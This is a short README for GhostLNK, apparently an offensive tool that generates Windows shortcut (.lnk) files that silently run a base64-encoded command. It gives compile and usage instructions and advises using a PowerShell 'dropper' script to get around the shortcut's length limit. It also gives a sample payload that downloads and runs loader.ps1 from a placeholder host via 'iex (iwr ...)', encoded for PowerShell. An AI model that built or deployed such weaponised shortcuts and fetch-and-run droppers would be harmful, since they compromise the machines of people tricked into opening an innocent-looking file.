# GhostLNK
Command for compiling the file:

```bash
$ gcc ghostlnk.c -lole32 -lshell32 -o ghostlnk.exe
```

## How to use the file
For using the compiled file, we need to set 3 arguments:
```cmd
$ .\ghostlnk.exe <LOCAL|REMOTE> "<file>.lnk" '<BASE64>'
```

In each one we need to specify:
1. "LOCAL" or "REMOTE" to decide whether to check if the route can be written to ("LOCAL") or if it is not necessary to check ("REMOTE")
2. Path where the file is saved
3. Base64 of the command the lnk will execute

## Some things to keep in mind
The LNK file has a character limit, so it is advisable not to put a payload too big, that's why there is the `loader.ps1`, to use it as a dropper. Some of the payloads I used in the testing are:

```bash
$ echo -n 'iex (iwr http://<URL>:13313/loader.ps1 -UseBasicParsing)' | iconv -f utf-8 -t utf-16le | base64 -w 0
```

Virustotal hash: `a2cd090c7e476f1d769a5993833cbc66ee589027a6c98606229160a8464c1ecd`